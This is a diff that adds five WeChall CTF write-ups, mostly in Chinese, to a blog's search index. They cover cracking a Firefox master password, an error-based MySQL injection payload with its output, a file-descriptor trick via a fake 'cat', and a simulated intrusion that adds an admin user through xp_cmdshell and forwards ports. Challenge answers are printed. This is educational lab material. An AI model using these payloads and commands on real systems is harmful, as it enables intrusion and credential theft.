@@ -23965,4 +23965,329 @@ hello hacker how ya doing?"</strong></p>
         <tag>stegano</tag>
       </tags>
   </entry>
+  <entry>
+    <title>WeChall - Burning Fox</title>
+    <url>/wp/WeChall/wechall-burning-fox/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Burning Fox (Cracking) — score 4.</p>
+<p>Our security agency got delivered a copy of a portable firefox
+installation. Your job is to crack the master password so the
+authorities can investigate more websites and private content generated
+by this person.</p>
+<p>You can download the portable version from this folder, filename
+"burningfox.zip".</p>
+</blockquote>
+<p>提供一个 Firefox Portable 打包文件，需要破解其 Master Password
+以获取浏览器中保存的敏感信息。</p>
+<h3 id="solution">solution</h3>
+<p>这是一个 Firefox 密码破解 + 浏览器数据分析的两阶段挑战：</p>
+<ol type="1">
+<li><strong>破解 Master Password</strong>：从 <code>key3.db</code> 提取
+hash，用 John the Ripper 或 FireMaster 破解</li>
+<li><strong>分析浏览器数据</strong>：用破解的密码解锁
+Firefox，在保存的密码/历史/书签中找到挑战答案</li>
+</ol>
+<h3 id="步骤一破解-master-password">步骤一：破解 Master Password</h3>
+<p>下载 <code>burningfox.zip</code>，解压后定位到 Firefox 配置文件目录
+<code>FirefoxPortable/Data/profile/</code>。</p>
+<p>使用 John the Ripper 的 <code>mozilla2john</code> 工具从
+<code>key3.db</code> 提取 hash：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mozilla2john FirefoxPortable/Data/profile/key3.db &gt; mozhash.txt</span><br><span class="line">john --format=mozilla --wordlist=rockyou.txt mozhash.txt</span><br></pre></td></tr></table></figure>
+<p>Master Password 很快就能被 rockyou
+字典破解出来：<strong><code>wonderful</code></strong></p>
+<p>验证方法：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --format=mozilla --show mozhash.txt</span><br></pre></td></tr></table></figure>
+<p>拿到 Master Password 后，有两种路径找到答案：</p>
+<p><strong>方案 A</strong>：启动 Firefox Portable（需要 X11/Wine
+环境），用 Master Password 解锁，浏览浏览器中保存的密码和历史记录。</p>
+<p><strong>方案 B</strong>：直接用 SQLite 查看
+<code>signons.sqlite</code>（密码数据库），配合 Mozilla
+密码转储工具解密保存的凭据。</p>
+<p>答案不是 Master Password
+本身，而是浏览器中保存的一条特殊密码/书签。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">ThinKingOutSideTheBox</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>wechall</tag>
+        <tag>cracking</tag>
+        <tag>firefox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WeChall - Light in the Darkness</title>
+    <url>/wp/WeChall/wechall-light-in-the-darkness/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Light in the Darkness (MySQL, Exploit) — score 6, by Mawekl.</p>
+<p>This challenge is the sequel to the "Blinded by the lighter"
+challenge. Again your mission is to extract an md5 password hash out of
+the database. This time your limit for this sql injection are 2 queries.
+Also you have to accomplish this task 3 times consecutively, to prove
+you have solved the challenge. Again you are given the sourcecode of the
+vulnerable script, also as highlighted version. To restart the
+challenge, you can execute a reset. Thanks to Mawekl for his motivation!
+Good luck!</p>
+</blockquote>
+<p>前作 "Blinded by the lighter" 的升级版。同样是 SQL 注入提取 MD5
+password hash，但限制更严：<strong>最多 2
+次查询</strong>（整个挑战生命周期），且需要 <strong>连续 3
+轮成功</strong> 才算通关。</p>
+<h3 id="源码分析">源码分析</h3>
+<p>完整源码在 <code>gizmore/gwf3</code> GitHub 仓库：</p>
+<ul>
+<li><code>www/challenge/Mawekl/light_in_the_darkness/vuln.php</code> —
+注入点</li>
+<li><code>www/challenge/Mawekl/light_in_the_darkness/index.php</code> —
+表单逻辑</li>
+<li><code>www/challenge/Mawekl/light_in_the_darkness/install.php</code>
+— 挑战初始化</li>
+</ul>
+<p><strong>vuln.php — 注入点：</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blightVuln</span>(<span class="params"><span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment"># Filter: blocks /* and &quot;blight&quot; in the injection string</span></span><br><span class="line">    <span class="keyword">if</span> ( (<span class="title function_ invoke__">strpos</span>(<span class="variable">$password</span>, <span class="string">&#x27;/*&#x27;</span>) !== <span class="literal">false</span>) || (<span class="title function_ invoke__">stripos</span>(<span class="variable">$password</span>, <span class="string">&#x27;blight&#x27;</span>) !== <span class="literal">false</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$db</span> = <span class="title function_ invoke__">blightDB</span>();</span><br><span class="line">    <span class="variable">$sessid</span> = <span class="title class_">GWF_Session</span>::<span class="title function_ invoke__">getSessSID</span>();</span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT 1 FROM (SELECT password FROM blight WHERE sessid=<span class="subst">$sessid</span>) b WHERE password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">queryFirst</span>(<span class="variable">$query</span>) !== <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>关键点：</strong></p>
+<ul>
+<li>注入点在 WHERE 子句，<code>password</code> 列来自子查询别名
+<code>b</code></li>
+<li>过滤器：禁止 <code>/*</code>（堵多行注释截断）和
+<code>blight</code>（堵直接引用表名）</li>
+<li><code>setVerbose(true)</code>：SQL 错误会完整回显到页面 ——
+<strong>这是报错注入的前提条件</strong></li>
+<li><code>queryFirst()</code> 使用
+<code>mysqli_query()</code>（不支持堆叠查询）</li>
+<li>SLEEP/BENCHMARK 未被过滤，但 2
+次查询限制让时间/布尔盲注都不可行</li>
+</ul>
+<p><strong>index.php — 表单逻辑：</strong></p>
+<ul>
+<li><code>injection</code> + <code>inject</code> →
+<code>blightVuln($password)</code></li>
+<li><code>thehash</code> + <code>mybutton</code> →
+<code>blightGetHash()</code> 从 DB 读 hash 并比对</li>
+<li><code>reset=me</code> → 显示旧 hash（如果有），然后生成新 hash</li>
+</ul>
+<p><strong>限制：</strong> 常数 <code>BLIGHT3_ATTEMPS</code> =
+2（源码中的拼写，非笔误），最大允许 attempt = 3。每次 inject 或 hash
+提交消耗 1 次 attempt。每次成功提交 hash 后 attempt 重置为 0，同时
+consecutive 计数器 +1。连续 3 轮成功后 challenge solved。</p>
+<h3 id="solution">solution</h3>
+<p>核心思路：利用 MySQL <code>GROUP BY</code> 对非确定性表达式
+<code>FLOOR(RAND(0)*2)</code> 的求值 bug，触发
+<code>Duplicate entry</code> 错误，在错误信息中泄露
+<code>CONCAT(password, FLOOR(RAND(0)*2))</code> 的值。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or (select count(*) from information_schema.COLLATIONS group by concat(password,floor(rand(0)*2))) --</span><br></pre></td></tr></table></figure>
+<p><strong>为什么用 <code>RAND(0)</code>（有种子）而不是
+<code>RAND()</code>：</strong></p>
+<ul>
+<li><code>RAND(0)</code> 产生确定序列：0, 1, 1, 0, 1, 0, 0, 1, ...</li>
+<li>第 2 行和第 3 行都得到值 1，导致 GROUP BY
+临时表唯一键冲突，触发报错</li>
+<li><code>RAND()</code>（无种子）每次序列随机，不可靠</li>
+<li>注意：序列依赖 MySQL 版本（5.x vs 8.x 可能不同）</li>
+</ul>
+<p><strong>为什么用
+<code>information_schema.COLLATIONS</code>：</strong></p>
+<ul>
+<li>比 <code>information_schema.TABLES</code> 更轻量，不会锁 MyISAM
+表</li>
+<li>需要至少 3 行的表（RAND(0) 的重复在行 2-3 出现，所以要求表 &gt;= 3
+行）</li>
+</ul>
+<p><strong>密码提取：</strong> Duplicate entry 显示的是
+<code>CONCAT(password, FLOOR(RAND(0)*2))</code>，即
+<code>password0</code> 或 <code>password1</code>（尾部数字是 RAND
+输出）。 密码 = Duplicate entry 值的前 32 字符（MD5 hex 正好 32
+位）。</p>
+<h3 id="攻击流程"><strong>攻击流程</strong></h3>
+<p>每轮 2 次操作：1 次注入提取（消耗 1 attempt）+ 1 次 hash 提交（消耗 1
+attempt），共 3 轮。</p>
+<ol type="1">
+<li><code>reset=me</code> → 重置挑战，attempt=0，生成新 hash</li>
+<li>注入提取 → attempt=1，错误信息中拿到 password</li>
+<li>提交 hash → attempt=2，成功 → attempt 归零，新 hash 生成</li>
+<li>重复步骤 2-3 两次</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Round 1</span><br><span class="line">injection=&#x27; or (select count(*) from information_schema.COLLATIONS group by concat(password,floor(rand(0)*2))) --</span><br><span class="line">→ Duplicate entry &#x27;A43B4E914FD58059B5526D2B46854F411&#x27;</span><br><span class="line">→ password = A43B4E914FD58059B5526D2B46854F41</span><br><span class="line">→ submit hash → OK, need 2 more</span><br><span class="line"></span><br><span class="line"># Round 2</span><br><span class="line">→ Duplicate entry &#x27;217CD978A6269E1C6E6116FB3E6591CF1&#x27;</span><br><span class="line">→ password = 217CD978A6269E1C6E6116FB3E6591CF</span><br><span class="line">→ submit hash → OK, need 1 more</span><br><span class="line"></span><br><span class="line"># Round 3</span><br><span class="line">→ Duplicate entry &#x27;0B0A3307D46435DA0EDDC93E37A2D7B11&#x27;</span><br><span class="line">→ password = 0B0A3307D46435DA0EDDC93E37A2D7B1</span><br><span class="line">→ submit hash → CHALLENGE SOLVED!</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>sqli</tag>
+        <tag>wechall</tag>
+        <tag>mysql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WeChall - Warchall Tryouts</title>
+    <url>/wp/WeChall/wechall-warchall-tryouts/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Warchall: Tryouts (Warchall) — score 6.</p>
+<p>This challenge is the first of the warchall series. You might want to
+play the other warchall challenges too.</p>
+<p>Level: easy</p>
+</blockquote>
+<p><strong>前置条件：</strong> 需要 WeChall → Warchall
+账号关联，并可通过 SSH 登录 Warchall 服务器。</p>
+<h3 id="源码分析">源码分析</h3>
+<p>SSH 登录 Warchall 后，在 home 目录找到 <code>tryouts</code>
+二进制和源码：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pwd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">userinfo</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> passFd = <span class="number">0</span>, randFd = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">512</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">17</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> input = <span class="number">0</span>, rand = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> correct = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read the password file */</span></span><br><span class="line">    passFd = open(<span class="string">&quot;solution.txt&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (passFd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read random bytes for comparison */</span></span><br><span class="line">    randFd = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (randFd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read one byte from urandom to compare */</span></span><br><span class="line">    read(randFd, &amp;rand, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read 17 bytes from solution.txt */</span></span><br><span class="line">    read(passFd, password, <span class="number">16</span>);</span><br><span class="line">    password[<span class="number">16</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;ve got a random number for you: %d\n&quot;</span>, rand);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* fork and exec cat for comparison */</span></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* child: replaces comparison with cat */</span></span><br><span class="line">        system(<span class="string">&quot;cat&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="solution">solution</h3>
+<ol type="1">
+<li>程序打开 <code>solution.txt</code> 获取文件描述符
+<code>passFd</code>（通常是 fd 3）</li>
+<li>读取 password 后用 <code>fork()</code> 创建子进程</li>
+<li>子进程执行 <code>system("cat")</code></li>
+<li><code>fork(2)</code> 文档：子进程继承父进程的打开文件描述符</li>
+<li>文件描述符共享当前文件偏移量——<code>solution.txt</code> 已被读到
+EOF</li>
+</ol>
+<p><strong>关键：</strong> 子进程中的 <code>cat</code> 可以通过
+<code>/proc/self/fd/3</code> 访问
+<code>solution.txt</code>，但直接读会得到
+EOF（文件偏移已在末尾）。需要<strong>重置偏移量</strong>。</p>
+<p>创建自己的 <code>cat</code> 命令，替换 PATH 中的系统
+<code>cat</code>，使其从 fd 3 读取并先 <code>lseek</code> 重置偏移：</p>
+<p><strong>方案一：Perl</strong></p>
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings;</span><br><span class="line"><span class="keyword">open</span> F, <span class="string">&#x27;&lt;&amp;3&#x27;</span>;</span><br><span class="line"><span class="keyword">seek</span> F, <span class="number">0</span>, <span class="number">0</span>;</span><br><span class="line"><span class="keyword">my</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">read</span> F, <span class="variable">$a</span>, <span class="number">1024</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">while</span> (&lt;&gt;) &#123; <span class="keyword">print</span> &#125;</span><br></pre></td></tr></table></figure>
+<p><strong>方案二：Python</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">f = os.fdopen(<span class="number">3</span>)</span><br><span class="line">f.seek(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(f.read(<span class="number">17</span>))</span><br></pre></td></tr></table></figure>
+<p><strong>方案三：C</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    lseek(<span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> n = read(<span class="number">3</span>, buf, <span class="number">255</span>);</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">0</span>)</span><br><span class="line">        write(<span class="number">1</span>, buf, n);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>执行步骤：</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编译自定义 cat</span></span><br><span class="line"><span class="built_in">cat</span> &gt; ~/bin/cat.c &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">    char buf[256] = &#123;0&#125;;</span><br><span class="line">    lseek(3, 0, 0);</span><br><span class="line">    int n = <span class="built_in">read</span>(3, buf, 255);</span><br><span class="line">    <span class="keyword">if</span> (n &gt; 0) write(1, buf, n);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">gcc -o ~/bin/cat ~/bin/cat.c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保 PATH 优先使用我们的 cat</span></span><br><span class="line"><span class="built_in">export</span> PATH=~/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行 tryouts，它会 fork 并执行我们的 cat</span></span><br><span class="line">./tryouts</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">EveryDayShuffle4</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>wechall</tag>
+        <tag>warchall</tag>
+        <tag>exploitation</tag>
+        <tag>fd</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WeChall - Z - Reloaded</title>
+    <url>/wp/WeChall/wechall-z-reloaded/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Z - Reloaded (Exploit, Simulated, Storyline) — score 6</p>
+<p>Before starting the challenge I suggest you to save every information
+and solution, because later in the challenge it is likely that you will
+need them again. Especially if you see passwords in the narrator
+box.</p>
+</blockquote>
+<p>Z 系列故事线的一部分。扮演
+Trinity（黑客帝国），通过模拟终端执行一系列渗透任务，最终瘫痪城市电网。</p>
+<h3 id="关卡攻略">关卡攻略</h3>
+<p>游戏引擎在 <code>zshellz.php</code>，答案存储在
+<code>zshellz_answers.php</code>（gitignored）。源码和语言文件可从
+<code>gizmore/gwf3</code> GitHub 仓库获取。</p>
+<h4 id="level-1-nmap-扫描">Level 1 — nmap 扫描</h4>
+<p>任务：对 10.2.2.2 执行 stealth SYN 扫描。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -v -sS 10.2.2.2</span><br></pre></td></tr></table></figure>
+<p>输出显示目标运行 OpenSSH 2.2.0。</p>
+<h4 id="level-2-漏洞源文件">Level 2 — 漏洞源文件</h4>
+<p>任务：找出脆弱服务，命名包含安全漏洞的源文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deattack.c</span><br></pre></td></tr></table></figure>
+<p>对应 SSH CRC32 漏洞（CVE-2001-0144），<code>detect_attack()</code>
+函数在 <code>deattack.c</code> 中。</p>
+<h4 id="level-3-sshnuke-利用">Level 3 — sshnuke 利用</h4>
+<p>任务：使用电影中的著名命令攻击脆弱服务。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sshnuke 10.2.2.2 -rootpw=&quot;Z1ON0101&quot;</span><br></pre></td></tr></table></figure>
+<p>命令格式源自 Matrix Reloaded 电影画面</p>
+<h4 id="level-4-ssh-端口转发">Level 4 — SSH 端口转发</h4>
+<p>任务：建立 SSH 隧道将本地 MSSQL 端口转发到内网数据库服务器
+192.168.10.2。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -L 1433:192.168.10.2:1433 10.2.2.2</span><br></pre></td></tr></table></figure>
+<p>SSH 密码：<code>Z1ON0101</code>（sshnuke 重置后的 root 密码）</p>
+<h4 id="level-5-输入密码">Level 5 — 输入密码</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Z1ON0101</span><br></pre></td></tr></table></figure>
+<h4 id="level-6-osql-登录-mssql">Level 6 — osql 登录 MSSQL</h4>
+<p>任务：使用 osql 客户端登录 MSSQL 2000 服务器。利用 MSSQL 2000
+著名漏洞——默认空 SA 密码。</p>
+<p><code>-P</code> 参数无值即 NULL 密码，这是 MSSQL 2000
+默认安装的著名弱点。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">osql -U sa -P</span><br></pre></td></tr></table></figure>
+<h4 id="level-7-添加-windows-用户">Level 7 — 添加 Windows 用户</h4>
+<p>任务：添加 Windows 用户 trinity，密码 Z1ON0101。</p>
+<p>利用 <code>xp_cmdshell</code> 扩展存储过程执行系统命令——MSSQL 2000
+默认启用。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec xp_cmdshell &#x27;net user trinity Z1ON0101 /add&#x27;</span><br></pre></td></tr></table></figure>
+<h4 id="level-8-添加用户到管理员组">Level 8 — 添加用户到管理员组</h4>
+<p>任务：将 trinity 加入 administrators 组。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec xp_cmdshell &#x27;net localgroup administrators trinity /add&#x27;</span><br></pre></td></tr></table></figure>
+<h4 id="level-9-rdp-端口转发">Level 9 — RDP 端口转发</h4>
+<p>任务：建立新的端口转发，将本地 RDP 端口通过网关转发到数据库服务器的
+RDP 端口。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -L 3389:192.168.10.2:3389 10.2.2.2</span><br></pre></td></tr></table></figure>
+<h4 id="level-10-反向端口转发">Level 10 — 反向端口转发</h4>
+<p>任务：将网关 10.2.2.2 端口 222 转发到本机 164.109.44.69 端口 22。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -R 222:164.109.44.69:22 10.2.2.2</span><br></pre></td></tr></table></figure>
+<h4 id="level-11-scp-传输文件">Level 11 — SCP 传输文件</h4>
+<p>任务：从数据库服务器复制病毒文件到本机。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -P 222 trinity@10.2.2.2:/home/trinity/nasty_virus .</span><br></pre></td></tr></table></figure>
+<h4 id="level-12">Level 12</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MyL0v315N30</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>wechall</tag>
+        <tag>realistic</tag>
+        <tag>storyline</tag>
+        <tag>simulation</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WeChall - Railsbin</title>
+    <url>/wp/WeChall/wechall-railsbin/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Railsbin (Exploit) — score 3, by gizmore.</p>
+<p>The project named "railsbin" is open source, but has a few security
+problems. Can you exploit the demo site? The solution is the password
+hash of user solution.</p>
+</blockquote>
+<p>Railsbin 是一个开源 Ruby on Rails pastebin demo。源码在 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dpem1vcmUvcmFpbHNiaW4=">gizmore/railsbin<i class="fa fa-external-link-alt"></i></span>。目标是得到用户
+<code>solution</code> 的 bcrypt password hash。</p>
+<h3 id="solution">Solution</h3>
+<p>源码审计发现 <code>UsersController#index</code> 有一个漏洞：</p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># app/controllers/users_controller.rb:8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span></span><br><span class="line">  <span class="variable">@users</span> = <span class="title class_">User</span>.all</span><br><span class="line">  <span class="variable">@users</span>.map &#123;|<span class="params">u</span>| u.password = u.encrypted_password &#125;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p>将 <code>encrypted_password</code>（bcrypt hash）复制到虚拟属性
+<code>password</code> 上。JSON view 直接序列化暴露：</p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># app/views/users/index.json.jbuilder</span></span><br><span class="line">json.extract! user, <span class="symbol">:id</span>, <span class="symbol">:name</span>, <span class="symbol">:email</span>, <span class="symbol">:password</span></span><br></pre></td></tr></table></figure>
+<p><strong>无需认证</strong>，直接请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET https://railsbin.wechall.net/users.json</span><br></pre></td></tr></table></figure>
+<p>返回所有用户的完整 bcrypt hash，包括 <code>solution</code> 用户：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">17</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;solution&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;solution@wechall.net&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$2a$10$44GwiA6ai0wxjzhFkeyjuO3kdVvmco8ReypH7H1tLsM2OrRFhe4CK&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">$2a$10$44GwiA6ai0wxjzhFkeyjuO3kdVvmco8ReypH7H1tLsM2OrRFhe4CK</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>wechall</tag>
+        <tag>rails</tag>
+      </tags>
+  </entry>
 </search>
